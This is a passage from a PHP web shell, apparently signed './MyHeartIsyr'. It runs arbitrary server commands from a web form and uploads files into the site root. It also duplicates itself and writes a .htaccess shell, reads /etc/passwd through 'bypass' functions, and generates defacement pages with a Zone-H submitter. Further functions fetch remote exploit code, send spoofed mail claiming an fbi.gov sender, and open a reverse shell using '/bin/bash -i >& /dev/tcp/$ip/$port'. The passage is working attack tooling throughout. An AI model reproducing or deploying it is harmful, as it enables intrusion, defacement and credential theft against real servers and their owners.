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";

$info = "System: <font color='lime'>".php_uname()."</font> <a href='".$edblink."' target='_blank'>[Exploit-DB]</a> <a href='".$google."' target='_blank'>[Google]</a><br>";
$info .= "Apache Info: <font color='lime'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
$info .= "PHP Version: <font color='lime'>".phpversion()."</font><br>";
$info .= "Zend Version: <font color='lime'>".zend_version()."</font><br>";
$info .= "Safe Mode: ".$sm."<br>";
$info .= "Server Ip: ".@gethostbyname($_SERVER['HTTP_HOST'])." | Your Ip: ".$_SERVER['REMOTE_ADDR']."<br>";
$info .= "MySQL: ".ex_func('mysql_connect')." | MSSQL: ".ex_func('mssql_connect')." | PostgreSQL: ".ex_func('pg_connect')." | Oracle: ".ex_func('oci_connect')." | Ibase: ".ex_func('ibase_connect')." | DBase: ".ex_func('dbase_create')."<br>";

$judul = sprintf("%s - %s", $my_config['title'], $my_config['version']);
?>
<html charset="<?=$charset?>">
<head>
<meta name="robots" content="noindex, nofollow">
<title><?=$judul?></title>
<link rel="shotrcut icon" href="<?=$my_logo?>" type="image/x-icon">
<style type="text/css">
body {
background: #000000;
color: #ffffff;
font-family: Comic Sans MS;
}
.kalong {
border: 1px solid #fff;
}
.kakanda{
background-color: #333333;
border-bottom: 1px solid #fff;
}
input {
background: transparent;
color: #fff;
border: 1px solid #fff;
}
input[type="text"] {
width: 450px;
}
textarea {
background: transparent;
color: #fff;
border: 1px solid #fff;
resize: none;
width: 100%;
height: 100px;
}
input[type="submit"] {
border-radius: 5px;
}
#tools td {
border: 1px solid #fff;
}
pre {
font-family: Courier;
}
input[type="submit"]:hover {
background: #ffbf00;
color: #ff0000;
}
.logo {
font-family: Bleeding Cowboys;
font-size: 40px;
}
a {
text-decoration: none;
color: #ff0000;
}
a:hover {
border-bottom: 1px solid #fff;
}
pre {
font-family: Courier;
}
.iseng {
border: 1px solid #444;
padding: 5px;
margin: 0;
overflow: auto;
}
#list a {
font-family: Consolas;
}
select {
background: transparent;
color: #fff;
border: 1px solid #fff;
}
option {
background: #000;
color: #fff;
border: 1px solid #fff;
}
</style>
</head>
<body>
<table><tr><td><table><tr><td><center><img src="<?=$my_header?>" width="200" height="200"></center></td></tr></table></td><td><table>
<tr><td><?=$info?></td></tr></table></td><td><table><tr><td>
<form method="post">
<select name="alat">
<option value="hiji">Duplicate Shell</option>
<option value="dua">.htaccess Shell</option>
</select>
<input type="submit" name="bikin" value=">>">
</form>
</td></tr></table></td></tr></table>
<?php
if(isset($_POST['bikin'])){
	global $duplicate_name, $hta;
	$alat = $_POST['alat'];
	switch($alat){
		case "hiji":
			$fp = fopen("wakanda_asdf.php", "w");
			fwrite($fp, file_get_contents($_SERVER['PHP_SELF']));
			fclose($fp);
			echo "<script>alert('Duplicate shell success');</script>";
			break;
		case "dua":
			$fp = @fopen(".htaccess", "w");
			fwrite($fp, $hta);
			fclose($fp);
			echo "<script>alert('.htaccess shell success');</script>";
			break;
		default: break;
	}
}
?>
<div id="tools">
<table><tr><td><table class="kalong"><tr><td class="kakanda">Command Line</td></tr>
<tr><td><form method="post"><input type="text" name="cmd"><br><input type="text" name="cwd" value="<?=@getcwd()?>">
<input type="submit" name="exe" value=">>"></form></td></tr></table></td><td><table width="400" class="kalong"><tr><td class="kakanda">
Upload File</td></tr>
<tr><td><form enctype="multipart/form-data" method="post"><center><input type="radio" checked name="tipe" value="biasa">Biasa
<input type="radio" name="tipe" value="public_html">public_html</center>
<input type="file" name="filenyo">&nbsp;<input type="submit" name="send" value=">>"></form></td></tr></table></td><td>
<table class="kalong"><tr><td class="kakanda">Download File</td></tr><tr><td><form method="post"><input type="text" name="web" value="http://www.example.com"><br>
<input type="text" name="box" value="<?=@getcwd()?>">
<select name="down_type">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wget">GET</option>
<option value="wlinks">links</option>
<option value="wcurl">curl</option>
</select>
<input type="submit" name="sedot" value=">>"></form></td></tr></table></td></tr>
<tr><td><table class="kalong" width="470">
<tr><td class="kakanda">Bypass Users Server</td></tr>
<tr><td><form method="post"><input type="text" name="the_file" style="width: 250px;">
<select name="kind_bypass">
<option value="xsystem">system</option>
<option value="xshell_exec">shell_exec</option>
<option value="xpassthru">passthru</option>
<option value="xawk">awk program</option>
<option value="xexec">exec</option>
</select><br>
<input type="submit" name="byebye" value=">>"></form></td></tr></table></td><td><table class="kalong">
<tr><td class="kakanda">Bypass Read File</td></tr>
<tr><td><form method="post"><input type="text" name="my_file" style="width: 250px;">
<select name="readme">
<option value='show_source'>show_source</option>
<option value='highlight_file'>highlight_file</option>
<option value='readfile'>readfile</option>
<option value='include'>include</option>
<option value='require'>require</option>
<option value='file'>file</option>
<option value='fread'>fread</option>
<option value='file_get_contents'>file_get_contents</option>
<option value='fgets'>fgets</option>
<option value='curl_init'>curl_init</option>
</select>
<input type="submit" name="baca" value=">>"></form></td></tr></table></td><td><table width="470" class="kalong">
<tr><td class="kakanda">Bypass /etc/passwd</td></tr>
<tr><td><form method="post"><select name="bypass">
<option value="mshell_exec">shell_exec</option>
<option value="msystem">system</option>
<option value="mexec">exec</option>
<option value="mpassthru">passthru</option>
<option value="mposix_getpwuid">posix_getpwuid</option>
</select>
<input type="submit" name="blekok" value=">>"></form></td></tr></table></td></tr>
<tr><td><table class="kalong" width="470"><tr><td class="kakanda">Deface Script Generator</tr></td>
<tr><td><form method="post"><input type="text" name="namanyalah" value="siganteng.html"><br>
<input type="text" name="title_deface" value="./MyHeartIsyr is Here"><br>
<input type="text" name="url-gambar" value="http://site.com/pict.jpg"><br>
<select name="bekgrond">
<option value="black">Black</option>
<option value="blue">Blue</option>
<option value="green">Green</option>
<option value="red">Red</option>
</select><br>
<textarea name="katakata" style="width: 250px; height: 60px;">
Sorry, i'm just test your security. Don't be mad :D
Ciao!
</textarea><br>
<input type="submit" name="generate" value=">>">
</form></td></tr></table></td><td><table width="400" class="kalong"><tr><td class="kakanda">Encoder</td></tr>
<tr><td><form method="post"><input style="width: 350px;" type="text" name="string" value="Hack4Palestine">
<select name="type_encode">
<option value="base64_encode">Base64 Encode</option>
<option value="base64_decode">Base64 Decode</option>
<option value="md5">md5 hash</option>
<option value="sha1">sha1 hash</option>
<option value="htmlspecialchars">htmlspecialchars encode</option>
<option value="htmlspecialchars_decode">htmlspecialchars decode</option>
<option value="urlencode">Url Encode</option>
<option value="urldecode">Url Decode</option>
<option value="sha1-md5">sha1 + md5</option>
</select>
<input type="submit" name="go_enc" value=">>"></form></td></tr></table></td><td><table width="470" class="kalong">
<tr><td class="kakanda">Ghost Mail</td></tr>
<tr><td><form method="post"><textarea name="msg" style="width: 250px; height: 50px;">Pwned by ./MyHeartIsyr</textarea><br>
<input type="text" name="atom_to" style="width: 150px;" value="target@mail.com"><input type="text" name="atom_subject" value="I Was Here" style="width: 150px;">
<input type="submit" name="go_hantu" value=">>"></form></td></tr></table></td></tr>
<tr><td><table width="470" class="kalong"><tr><td class="kakanda">Zone-H Submitter</td></tr>
<tr><td><form method="post"><input type="text" name="hacker" value="./MyHeartIsyr" style="width: 250px;"><br>
<select name="hackmode">
<option>---------------------------Select One---------------------------</option>
<option value="1">Known Vulnerability (i.e. Unpatched System)</option>
<option value="2">Undisclosed (new) Vulnerability</option>
<option value="3">Configuration / Admin Mistake</option>
<option value="4">Brute Force Attack</option>
<option value="5">Social Engineering</option>
<option value="6">Web Server Intrusion</option>
<option value="7">Web Server External Module Intrusion</option>
<option value="8">Mail Server Intrusion</option>
<option value="9">FTP Server Intrusion</option>
<option value="10">SSH Server Intrusion</option>
<option value="11">Telnet Server Intrusion</option>
<option value="12">RPC Server Intrusion</option>
<option value="13">Shares Misconfiguration</option>
<option value="14">Other Server Intrusion</option>
<option value="15">SQL Injection</option>
<option value="16">URL Poisoning</option>
<option value="17">File Inclusion</option>
<option value="18">Other Web Application Bug</option>
<option value="19">Remote Administrative Panel Access Bruteforcing</option>
<option value="20">Remote Administrative Panel Access Password Guessing</option>
<option value="21">Remote Administrative Panel Access Social Engineering</option>
<option value="22">Attack Against Administrator(Password StealingSniffing)</option>
<option value="23">Access Credentials Through Man In the Middle Attack</option>
<option value="24">Remote Service Password Guessing</option>
<option value="25">Remote Service Password Bruteforce</option>
<option value="26">Rerouting After Attacking The Firewall</option>
<option value="27">Rerouting After Attacking The Router</option>
<option value="28">DNS Attack Through Social Engineering</option>
<option value="29">DNS Attack Through Cache Poisoning</option>
<option value="30">Not available</option>
</select><br>
<select name="reason">
<option >---------------Select One-----------------</option>
<option value="1">Heh...Just For Fun!</option>
<option value="2">Revenge Against That Website</option>
<option value="3">Political Reasons</option>
<option value="4">As a Challenge</option>
<option value="5">I Just Want To Be The Best Defacer</option>
<option value="6">Patriotism</option>
<option value="7">Not Available</option>
</select><br>
<textarea name="domain" style="width: 350px; height: 70px;">List of Domains</textarea><br>
<input type="submit" name="sendtozoneh" value=">>"></form></td></tr></table></td><td><table class="kalong">
<tr><td class="kakanda">Load &amp; Exploit</td></tr>
<tr><td><form method="post"><input type="text" name="xpl_code" value="http://www.somesite.com/xpl.c" style="width: 350px;">
<select name="prog_load">
<option value="c">C</option>
<option value="cpp">C++</option>
<option value="pl">Perl</option>
<option value="py">Python</option>
<option value="rb">Ruby</option>
</select>
<select name="downtype">
<option value="wwget">wget</option>
<option value="wlynx">lynx</option>
<option value="wfread">fread</option>
<option value="wfetch">fetch</option>
<option value="wget">GET</option>
<option value="wlinks">links</option>
<option value="wcurl">curl</option>
</select>
<input type="submit" name="load" value=">>"></form></td></tr></table></td><td><table width="470" class="kalong">
<tr><td class="kakanda">Back Connect</td></tr>
<tr><td><form method="post"><input type="text" name="ip_bc" value="<?=$_SERVER['REMOTE_ADDR']?>" style="width: 150px;"><br>
<input type="text" name="port_bc" value="1337" style="width: 150px;"><br>
<input type="submit" name="go_bc" value=">>"></form></td></tr></table></td></tr>
<tr><td><table class="kalong" width="470"><tr><td class="kakanda">Ghost Mass Mailer</td></tr>
<tr><td><form method="post"><textarea name="pesan" style="width: 250px; height: 50px;"></textarea><br>
<input type="text" name="orang-orang" placeholder="Pisahkan dengan ;" style="width: 250px;"><br>
<input type="text" name="subjek" value="Aku bukan musuhmu!!" style="width: 150px;">
<input type="submit" name="kirim_coy" value=">>"></form></td></tr></table></td><td><table class="kalong">
<tr><td class="kakanda">Hash Analyzer</td></tr>
<tr><td><form method="post">
<input type="text" name="hashid" style="width: 375px;"><input type="submit" name="analyze" value=">>"></form>
</td></tr></table></td><td><table class="kalong"><tr><td class="kakanda">Admin Finder</td></tr>
<tr><td><form method="post"><input type="text" name="site" value="http://www.target.com">
<input type="submit" name="find" value=">>"></form></td></tr></table></td></tr></table>
</td></tr></table></div>
<?php
if(empty($_POST['exe'])){
	if(strtolower(substr(PHP_OS,0,3)) == "win"){
		$nama = "dir /a";
	}
	else {
		$nama = "ls -la";
	}
	echo "<pre class=\"iseng\">".lets_call($nama)."</pre>";
}
if(isset($_POST['exe'])){
	if(isset($_POST['cwd'])){
		@chdir($_POST['cwd']);
	}
	if(isset($_POST['cmd'])){
		echo "<pre class=\"iseng\">".lets_call($_POST['cmd'])."</pre>";
	}
}
elseif(isset($_POST['go_enc'])){
	$ini = $_POST['type_encode'];
	switch($ini){
		case "base64_encode":
			echo "<pre class=\"iseng\">".base64_encode($_POST['string'])."</pre>";
			break;
		case "base64_decode":
			echo "<pre class=\"iseng\">".base64_decode($_POST['string'])."</pre>";
			break;
		case "md5":
			echo "<pre class=\"iseng\">".md5($_POST['string'])."</pre>";
			break;
		case "sha1":
			echo "<pre class=\"iseng\">".sha1($_POST['string'])."</pre>";
			break;
		case "htmlspecialchars":
			echo "<pre class=\"iseng\">".htmlspecialchars($_POST['string'])."</pre>";
			break;
		case "htmlspecialchars_decode":
			echo "<pre class=\"iseng\">".htmlspecialchars_decode($_POST['string'])."</pre>";
			break;
		case "urlencode":
			echo "<pre class=\"iseng\">".urlencode($_POST['string'])."</pre>";
			break;
		case "urldecode":
			echo "<pre class=\"iseng\">".urldecode($_POST['string'])."</pre>";
			break;
		case "sha1-md5":
			echo "<pre class=\"iseng\">".sha1(md5($_POST['string']))."</pre>";
			break;
		default: break;
	}
}
elseif(isset($_POST['send'])){
	$tipeku = $_POST['tipe'];
	switch($tipeku){
		case "biasa":
			if(@copy($_FILES['filenyo']['tmp_name'], "".@getcwd()."/".$_FILES['filenyo']['name']."")){
				echo "<script>alert('[!] Berhasil coy!');</script>";
			}
			else {
				echo "<script>alert('[!] Gagal euy!');</script>";
			}
			break;
		case "public_html":
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['filenyo']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['filenyo']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])){
				if(@copy($_FILES['filenyo']['tmp_name'], $root)){
					echo "<script>alert('[!] Berhasil!');</script>";
				}
				else {
					echo "<script>alert('[!] Gagal!');</script>";
				}
			}
			else {
				echo "<script>alert('[i] Direktorinya gak writeable');</script>";
			}
			break;
		default: break;
	}
}
elseif(isset($_POST['analyze'])){
	$hashtodo = substr($_POST['hashid'], 0, 3);
	if($hashtodo == '$ap' && strlen($_POST['hashid']) == 37){
		echo "The hash :".$_POST['hashid']." is MD5(APR) hash";
	}
	elseif($hashtodo == '$1$' && strlen($_POST['hashid']) == 34){
		echo "The hash : ".$_POST['hashid']." is MD5(Unix) hash";
	}
	elseif($hashtodo == '$H$' && strlen($_POST['hashid']) == 35){
		echo "The hash : ".$_POST['hashid']." is MD5(phpBB3) hash";
	}
	elseif(strlen($_POST['hashid']) == 29){
		echo "The hash : ".$_POST['hashid']." is MD5(Wordpress) hash";
	}
	elseif($hashtodo == '$5$' && strlen($_POST['hashid']) == 64){
		echo "The hash : ".$_POST['hashid']." is SHA256(Unix) hash";
	}
	elseif($hashtodo == '$6$' && strlen($_POST['hashid']) == 128){
		echo "The hash : ".$_POST['hashid']." is SHA512(Unix) hash";
	}
	elseif(strlen($_POST['hashid']) == 56){
		echo "The hash : ".$_POST['hashid']." is SHA224 hash";
	}
	elseif(strlen($_POST['hashid']) == 64){
		echo "The hash : ".$_POST['hashid']." is SHA256 hash";
	}
	elseif(strlen($_POST['hashid']) == 96){
		echo "The hash : ".$_POST['hashid']." is SHA384 hash";
	}
	elseif(strlen($_POST['hashid']) == 128){
		echo "The hash : ".$_POST['hashid']." is SHA512 hash";
	}
	elseif(strlen($_POST['hashid']) == 40){
		echo "The hash : ".$_POST['hashid']." is MySQL v5.x hash";
	}
	elseif(strlen($_POST['hashid']) == 16){
		echo "The hash : ".$_POST['hashid']." is MySQL hash";
	}
	elseif(strlen($_POST['hashid']) == 13){
		echo "The hash : ".$_POST['hashid']." is DES(Unix) hash";
	}
	elseif(strlen($_POST['hashid']) == 32){
		echo "The hash : ".$_POST['hashid']." is MD5 hash";
	}
	elseif(strlen($_POST['hashid']) == 4){
		echo "The hash : ".$_POST['hashid']." is [CRC-16]-[CRC-16-CCITT]-[FCS-16] hash";
	}
	else {
		echo "Duh, apaan ya??";
	}
}
elseif(isset($_POST['generate'])){
	$script = "<html>
<head>
<title>".$_POST['title_deface']."</title>
<style type=\"text/css\">
body {
background: ".$_POST['bekgrond'].";
color: white;
}
* {
font-family: Courier;
}
</style>
</head>
<body>
<center><h1>Hello admin, Surprize!!</h1></center>
<center><img src=\"".$_POST['url-gambar']."\" width=\"300\" height=\"300\"></center><br>
<center><pre>".$_POST['katakata']."</pre></center>
</body>
</html>";
	$fp = @fopen($_POST['namanyalah'], "w");
	fwrite($fp, $script);
	fclose($fp);
	echo "<script>alert('Berhasil!');</script>";
}
elseif(isset($_POST['go_bc'])){
	$ip = $_POST['ip_bc'];
	$port = $_POST['port_bc'];
	lets_call("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
	echo "<script>alert('How to use? nc please');</script>";
}
elseif(isset($_POST['kirim_coy'])){
	$pesan = nl2br($_POST['pesan']);
	$orang = explode(";", $_POST['orang-orang']);
	$subjek = $_POST['subjek'];
	$dari = "myheart-isyr@fbi.gov";
	
	echo "<pre>";
